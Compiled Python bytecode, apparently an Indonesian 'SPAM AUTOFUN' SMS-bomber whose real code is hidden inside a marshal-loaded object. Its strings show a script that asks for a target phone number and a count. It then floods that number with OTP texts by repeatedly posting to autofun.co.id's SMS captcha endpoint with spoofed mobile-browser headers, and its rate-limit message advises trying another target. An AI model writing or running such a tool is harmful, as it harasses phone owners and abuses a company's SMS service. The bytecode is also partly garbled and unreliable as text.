?
?? bc           @   s!   d  d l  Z  e  j d ? d Ud S(   i????Ns?  c           @   s?   d  d l  Z  d  d l Z d  d l m Z m Z d  d l m Z d Z d Z d Z	 d ?  Z
 d d d	 ?  ?  YZ d
 e f d ?  ?  YZ d ?  Z e d k r? y e ?  Wq? e k
 r? e j ?  q? Xn  d S(   i????N(   t   systemt   sys(   t   sleeps   [1;97ms   [1;32ms   [1;95mc           C   s&   t  d ? d t t t t t f GHd  S(   Nt   clears?  %s          ____________
      ___/ ___________\
     / ___/           _____
    / /              (____ \
   | |   %sS P A M%s          \ \
   | |     %sA U T O F U N%s   ) )
    \ \__               __/ /
     \__ \_____________/ __/
        \_______________/


 [1;97m[[1;95m*[1;97m] Github    : oodiq
 [1;97m[[1;95m*[1;97m] YouTube   : Shodiq 2701 
 [1;97m[[1;95m*[1;97m] Instagram : oodiq_
(   R    t   BIPurplet   BIWhite(    (    (    t    t   banner   s    
t   Configc           B   s   e  Z d  ?  Z RS(   c         C   sx   d |  _  i d d 6d d 6d d 6d d	 6d
 d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6d d 6|  _ d  S(   Ns,   https://www.autofun.co.id:443/v2/captcha/smss   www.autofun.co.idt   Hosts
   keep-alivet
   Connectiont   84s   Content-lengths   */*t   accepts?   Mozilla/5.0 (Linux; Android 10; Redmi Note 8 Pro Build/QP1A.190711.020; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/97.0.4692.98 Mobile Safari/537.36s
   User-Agents#   id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7s   Accept-Languages   application/json;charset=UTF-8s   content-types   https://www.autofun.co.idt   Origins   acr.browser.bareboness   X-Requested-Withs   same-origins   Sec-Fetch-Sitet   corss   Sec-Fetch-Modet   emptys   Sec-Fetch-Dests&   https://www.autofun.co.id/mobil/datsunt   Referers   gzip, deflates   Accept-Encoding(   t   api_urlt   headers(   t   self(    (    R   t   __init__%   s     	(   t   __name__t
   __module__R   (    (    (    R   R   $   s   t	   Catchplayc           B   s   e  Z d  ?  Z RS(   c         C   s?   i | d 6d d 6d d 6d d 6} t  j |  j d | d	 |  j ??& } t j d
 t | j ? ? d } Wd  QX| d k r d GHn | d k r? d GHt j	 ?  n  d  S(   Nt   phoneNums   id-idt   languageCodet   idt   countryCodei   t   platformt   jsonR   s   {"code":(.*?),i    t   200s&    [1;97m[[1;95m*[1;97m] Done       t   134sM    [1;97m[[1;95m*[1;97m] LIMIT, coba lagi nanti atau ganti target yang lain(
   t   requestst   postR   R   t   ret   findallt   strt   textR   t   exit(   R   t   number_phoneR   t   rt   code(    (    R   t   spam:   s    
	%(   R   R   R*   (    (    (    R   R   9   s   c          C   s?   t  ?  t d ? }  t d ? } d GHx? t t | ? ? D]n } d } t ?  } | j |  ? xI t d ? D]; } t j j d | ? t j j	 ?  t
 d ? | d 8} qf Wq7 Wd  S(   Ns,    [1;97m[[1;95m*[1;97m] Target (628xxxx): s"    [1;97m[[1;95m*[1;97m] Jumlah: R   i   s&    [1;97m[[1;95m*[1;97m] Tunggu (%s)i   (   R   t   inputt   ranget   intR   R*   R   t   stdoutt   writet   flushR   (   t   targett   jumlaht   xt   tungguR*   t   i(    (    R   t   mainO   s    	
t   __main__(    (   R"   R    t   osR    R   t   timeR   R   t   greenR   R   R   R   R6   R   t   KeyboardInterruptR&   (    (    (    R   t   <module>   s   		(   t   marshalt   loads(    (    (    s	   spam2_.pyt   <module>   s   